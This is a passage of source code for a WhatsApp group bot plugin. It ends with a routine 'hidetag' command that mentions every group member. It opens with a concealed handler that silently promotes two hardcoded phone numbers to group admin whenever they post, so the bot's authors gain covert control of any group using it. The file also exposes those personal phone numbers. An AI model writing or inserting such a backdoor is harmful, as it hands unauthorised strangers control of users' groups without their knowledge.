        config.OWNER_NUMBER ? normalizeJid(config.OWNER_NUMBER) : null,
        normalizeJid("923199471258"),
        normalizeJid("923309046024"),
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    
    if (!AUTHORIZED_USERS.includes(senderNormalized)) return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        
        if (userParticipant && !userParticipant.admin) {
            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});

// ===================== HIDETAG =====================
cmd({
  pattern: "hidetag",
  alias: ["tag", "h"],  
  react: "🛫",
  desc: "Tag all members with a message or media",
  category: "group",
  use: '.hidetag Hello',
  filename: __filename
}, async (conn, mek, m, { from, q, isGroup, isOwner, participants, reply }) => {
  try {
    if (!isGroup) return reply("*❌ This command can only be used in groups.*");
    
    const { isSenderAdmin } = await isAdmin(conn, from, m.sender);
    
    if (!isOwner && !isSenderAdmin) {
      return reply("*❌ Only admins or the owner can use this command.*");
    }

    const mentionAll = { mentions: participants.map(u => u.id) };

    const sendText = async (text) => await conn.sendMessage(from, { text, ...mentionAll }, { quoted: mek });

    const sendMedia = async (buffer, type, caption = "") => {
      const content = {
        image: type === "imageMessage" ? buffer : undefined,
        video: type === "videoMessage" ? buffer : undefined,
        gifPlayback: type === "videoMessage" ? m.quoted.message?.videoMessage?.gifPlayback || false : undefined,
        audio: type === "audioMessage" ? buffer : undefined,
        ptt: type === "audioMessage" ? m.quoted.message?.audioMessage?.ptt || false : undefined,
        sticker: type === "stickerMessage" ? buffer : undefined,
        document: type === "documentMessage" ? buffer : undefined,
        mimetype: type === "documentMessage" ? m.quoted.message?.documentMessage?.mimetype : undefined,
        fileName: type === "documentMessage" ? m.quoted.message?.documentMessage?.fileName : undefined,
        caption: caption || m.quoted.text || "",
        ...mentionAll
      };
      await conn.sendMessage(from, content, { quoted: mek });
    };

    if (m.quoted) {
      const type = m.quoted.mtype || '';
      if (type === 'extendedTextMessage') return sendText(m.quoted.text || 'No message content.');
      if (['imageMessage','videoMessage','audioMessage','stickerMessage','documentMessage'].includes(type)) {
        try {
          const buffer = await m.quoted.download?.();
          if (!buffer) return reply("❌ Failed to download the quoted media.");
          await sendMedia(buffer, type);
        } catch { 
          return sendText(m.quoted.text || "📨 Message"); 
        }
      } else {
        return sendText(m.quoted.text || "📨 Message");
      }
    } else if (q) {
      await sendText(q);
    } else {
      return reply("❌ Please provide a message or reply to a message.");
    }

  } catch (e) {
    console.error("Hidetag Error:", e);
    reply(`❌ Error occurred:\n${e.message}`);
  }
});

